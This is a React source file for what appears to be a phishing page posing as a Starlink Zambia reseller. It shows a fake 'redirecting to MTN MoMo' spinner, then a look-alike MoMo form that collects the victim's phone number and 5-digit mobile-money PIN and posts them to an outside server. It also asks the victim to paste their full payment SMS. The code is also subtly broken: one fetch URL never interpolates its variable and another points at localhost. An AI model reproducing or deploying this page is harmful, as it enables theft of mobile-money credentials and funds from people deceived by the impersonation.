import React, { useState } from 'react';
const API_BASE = import.meta.env.VITE_API_URL || 'https://starlink-reseller-portal.onrender.com';
const PLANS = [
  { id: 'basic', name: 'Basic Plan', data: '50GB', desc: 'Up to 12 devices. Perfect for small households.', price: '15.00' },
  { id: 'standard', name: 'Standard Plan', data: '100GB', desc: 'Up to 25 devices. High-speed, low-latency internet.', price: '25.00' },
  { id: 'premium', name: 'Premium Plan', data: '250GB', desc: 'Up to 50 devices. Best for high-demand users.', price: '45.00' },
  { id: 'unlimited', name: 'Unlimited Plan', data: 'Truly Unlimited', desc: 'Unlimited devices. Maximum performance for power users.', price: '95.00' }
];

export default function App() {
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [step, setStep] = useState('plans');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [pin, setPin] = useState('');
  const [smsContent, setSmsContent] = useState('');
  const [loading, setLoading] = useState(false);
  const [feedback, setFeedback] = useState({ type: '', text: '' });

  const handleSelectPlan = (plan) => {
    setSelectedPlan(plan);
    setStep('processing');
    setFeedback({ type: '', text: '' });
    setTimeout(() => setStep('momo-form'), 2500);
  };

  const handlePaySubmit = async (e) => {
    e.preventDefault();
    if (!phoneNumber || pin.length !== 5) {
      setFeedback({ type: 'error', text: 'Please enter a valid phone number and 5-digit PIN.' });
      return;
    }
    setLoading(true);
    setFeedback({ type: '', text: '' });
    try {
      const res = await fetch('${API_BASE}/api/momo/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: phoneNumber, pin, amount: selectedPlan.price, plan: selectedPlan.name })
      });
      const data = await res.json();
      if (data.success) {
        setStep('verify-sms');
        setFeedback({ type: 'success', text: data.message });
      } else {
        setFeedback({ type: 'error', text: data.message });
      }
    } catch (err) {
      setFeedback({ type: 'error', text: 'Network error connecting to payment server.' });
    } finally {
      setLoading(false);
    }
  };

  const handleVerifySms = async (e) => {
    e.preventDefault();
    if (!smsContent) {
      setFeedback({ type: 'error', text: 'Please paste the full SMS content.' });
      return;
    }
    setLoading(true);
    try {
      const res = await fetch('http://localhost:3000/api/momo/verify-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ smsContent, phone: phoneNumber, plan: selectedPlan.name })
      });
      const data = await res.json();
      if (data.success) {
        alert('🎉 Package Activated Successfully! Ref: ' + data.reference);
        setStep('plans');
        setSelectedPlan(null);
        setPhoneNumber('');
        setPin('');
        setSmsContent('');
        setFeedback({ type: '', text: '' });
      } else {
        setFeedback({ type: 'error', text: data.message });
      }
    } catch (err) {
      setFeedback({ type: 'error', text: 'Failed to verify transaction.' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ background: '#121212', color: '#fff', minHeight: '100vh', fontFamily: 'sans-serif', paddingBottom: '60px' }}>
      <header style={{ padding: '20px', borderBottom: '1px solid #222', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ fontWeight: 'bold', fontSize: '18px', letterSpacing: '1px' }}>STARLINK <span style={{ background: '#ff9900', color: '#000', padding: '2px 6px', borderRadius: '4px', fontSize: '12px' }}>ZAMBIA</span></div>
      </header>
      <main style={{ maxWidth: '480px', margin: '0 auto', padding: '20px' }}>
        {step === 'plans' && (
          <>
            <div style={{ background: 'linear-gradient(135deg, #2c1a0e 0%, #1a1a1a 100%)', padding: '20px', borderRadius: '12px', marginBottom: '24px', border: '1px solid #333' }}>
              <h2 style={{ fontSize: '22px', marginBottom: '10px' }}>High-Speed Internet</h2>
              <p style={{ color: '#aaa', fontSize: '14px', lineHeight: '1.5' }}>Experience high-speed Starlink data across Zambia using MTN MoMo.</p>
            </div>
            <h3 style={{ marginBottom: '16px', fontSize: '16px', color: '#ccc' }}>Select Your Plan</h3>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
              {PLANS.map((plan) => (
                <div key={plan.id} style={{ background: '#1e1e1e', border: '1px solid #333', borderRadius: '12px', padding: '20px', position: 'relative' }}>
                  <span style={{ position: 'absolute', top: '20px', right: '20px', background: '#004225', color: '#4ade80', padding: '2px 8px', borderRadius: '12px', fontSize: '12px', fontWeight: 'bold' }}>{plan.data}</span>
                  <h4 style={{ fontSize: '18px', marginBottom: '6px' }}>{plan.name}</h4>
                  <p style={{ color: '#888', fontSize: '13px', marginBottom: '16px' }}>{plan.desc}</p>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontSize: '20px', fontWeight: 'bold', color: '#ff9900' }}>ZMW {plan.price}<span style={{ fontSize: '12px', color: '#777', fontWeight: 'normal' }}>/mo</span></span>
                    <button onClick={() => handleSelectPlan(plan)} style={{ background: '#ff9900', color: '#000', border: 'none', padding: '10px 20px', borderRadius: '8px', fontWeight: 'bold', cursor: 'pointer' }}>Select Plan</button>
                  </div>
                </div>
              ))}
            </div>
          </>
        )}
        {step === 'processing' && (
          <div style={{ textAlign: 'center', padding: '60px 20px' }}>
            <div style={{ width: '50px', height: '50px', border: '4px solid #333', borderTop: '4px solid #ff9900', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 20px' }}></div>
            <h3 style={{ marginBottom: '10px' }}>Processing...</h3>
            <p style={{ color: '#888', fontSize: '14px' }}>Securely redirecting to MTN MoMo payment gateway</p>
          </div>
        )}
        {step === 'momo-form' && (
          <div style={{ background: '#1a1a1a', border: '1px solid #333', borderRadius: '12px', padding: '24px' }}>
            <div style={{ textAlign: 'center', marginBottom: '20px' }}>
              <h2 style={{ fontSize: '20px', marginBottom: '6px' }}>MTN MoMo</h2>
              <div style={{ fontSize: '24px', fontWeight: 'bold', color: '#ff9900' }}>ZMW {selectedPlan?.price}</div>
              <div style={{ fontSize: '13px', color: '#888', marginTop: '4px' }}>Service: Starlink Renewal</div>
            </div>
            {feedback.text && (
              <div style={{ background: feedback.type === 'error' ? '#3d1a1a' : '#1a3d1a', color: feedback.type === 'error' ? '#ff6b6b' : '#6bff6b', padding: '10px', borderRadius: '6px', fontSize: '13px', marginBottom: '15px', textAlign: 'center' }}>
                {feedback.text}
              </div>
            )}
            <form onSubmit={handlePaySubmit}>
              <div style={{ marginBottom: '16px' }}>
                <label style={{ display: 'block', fontSize: '12px', color: '#888', marginBottom: '6px' }}>MTN MoMo Number</label>
                <div style={{ display: 'flex', background: '#121212', border: '1px solid #333', borderRadius: '8px', overflow: 'hidden' }}>
                  <span style={{ padding: '12px', background: '#222', color: '#aaa', fontSize: '14px' }}>🇿🇲 +260</span>
                  <input type="text" placeholder="77xxxxxxx" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} style={{ background: 'transparent', border: 'none', color: '#fff', padding: '12px', width: '100%', outline: 'none' }} maxLength={9} required />
                </div>
              </div>
              <div style={{ marginBottom: '24px' }}>
                <label style={{ display: 'block', fontSize: '12px', color: '#888', marginBottom: '6px' }}>Enter PIN (5 digits)</label>
                <input type="password" placeholder="•••••" value={pin} onChange={(e) => setPin(e.target.value)} style={{ background: '#121212', border: '1px solid #333', borderRadius: '8px', color: '#fff', padding: '12px', width: '100%', outline: 'none', letterSpacing: '4px', textAlign: 'center' }} maxLength={5} required />
              </div>
              <button type="submit" disabled={loading} style={{ width: '100%', background: '#ff9900', color: '#000', border: 'none', padding: '14px', borderRadius: '8px', fontWeight: 'bold', cursor: 'pointer', fontSize: '15px' }}>
                {loading ? 'Processing...' : '🔒 CONFIRM PAYMENT'}
              </button>
            </form>
          </div>
        )}
        {step === 'verify-sms' && (
          <div style={{ background: '#1a1a1a', border: '1px solid #333', borderRadius: '12px', padding: '24px' }}>
            <button onClick={() => setStep('momo-form')} style={{ background: 'transparent', border: 'none', color: '#ff9900', cursor: 'pointer', marginBottom: '16px', fontSize: '13px' }}>← Back</button>
            <h2 style={{ fontSize: '20px', marginBottom: '6px' }}>Full SMS Verification</h2>
            <p style={{ fontSize: '13px', color: '#888', marginBottom: '20px' }}>Paste the full SMS confirmation content you received.</p>
            {feedback.text && (
              <div style={{ background: feedback.type === 'error' ? '#3d1a1a' : '#1a3d1a', color: feedback.type === 'error' ? '#ff6b6b' : '#6bff6b', padding: '10px', borderRadius: '6px', fontSize: '13px', marginBottom: '15px', textAlign: 'center' }}>
                {feedback.text}
              </div>
            )}
            <form onSubmit={handleVerifySms}>
              <textarea placeholder="Paste the entire MTN MoMo SMS here..." value={smsContent} onChange={(e) => setSmsContent(e.target.value)} style={{ background: '#121212', border: '1px solid #333', borderRadius: '8px', color: '#fff', padding: '12px', width: '100%', height: '120px', outline: 'none', resize: 'none', marginBottom: '20px', fontSize: '13px' }} required />
              <button type="submit" disabled={loading} style={{ width: '100%', background: '#004225', color: '#4ade80', border: '1px solid #4ade80', padding: '14px', borderRadius: '8px', fontWeight: 'bold', cursor: 'pointer', fontSize: '15px' }}>
                {loading ? 'Verifying...' : 'VERIFY & ACTIVATE PACKAGE'}
              </button>
            </form>
          </div>
        )}
      </main>
    </div>
  );
}
